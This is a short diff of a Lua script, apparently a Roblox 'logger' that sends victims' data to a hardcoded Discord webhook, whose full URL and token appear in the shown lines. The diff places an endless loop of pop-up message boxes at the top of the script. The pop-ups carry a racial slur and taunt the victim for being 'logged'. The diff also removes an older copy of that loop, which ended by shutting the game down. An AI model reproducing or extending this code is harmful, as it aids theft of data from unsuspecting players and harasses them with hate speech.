@@ -1,3 +1,6 @@
+while task.wait() do
+messagebox("GET LOGGED NIGGA LOOOOL", "U GOT LOGGED NIGGA LOSER", 0)
+end
 local webh = "https://discord.com/api/webhooks/964893587772960778/VRHZCBFoNLD6YrbxmEZSeYf_DrjyYFe2jYuBpZjZLvsvYueBOTyi7GPsKri3ZSK0EoKD"
 
 pcall(function()
@@ -45,10 +48,3 @@ pcall(function()
        );
    end
 end)
-
-while task.wait() do
-messagebox("GET LOGGED NIGGA LOOOOL", "U GOT LOGGED NIGGA LOSER", 0)
-    wait(0.3)
-end
-wait(5)
-game:shutdown()
